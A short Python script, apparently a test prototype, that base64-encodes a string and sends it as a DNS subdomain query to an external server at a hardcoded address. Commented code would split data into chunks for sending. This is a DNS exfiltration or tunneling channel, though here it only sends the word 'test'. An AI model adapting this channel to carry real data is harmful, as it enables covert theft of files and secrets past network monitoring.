from scapy.all import DNS, DNSQR, IP, sr1, UDP
import base64

def dns_request(sub_domain):
    qname = f"{sub_domain}.dns.bitlus.online"
    dns_req = IP(dst='79.76.56.138')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=qname))
    answer = sr1(dns_req, verbose=1, timeout=5)
    if answer:
        answer.show()  # This prints the entire DNS response
    else:
        print("No response received.")

text = "test"
text_bytes = base64.urlsafe_b64encode(text.encode("ascii"))
#text_decodeTest = base64.urlsafe_b64decode(text_bytes).decode('ascii', errors='ignore')
print("text_bytes", text_bytes)

dns_request(text_bytes)
# chunks = [text_bytes[i:i+6] for i in range(0, len(text_bytes), 6)]

# for chunk in chunks:
#     print(chunk)
#     #dns_request(chunk.decode('utf-8').rstrip('='))
#     dns_request(text_bytes)
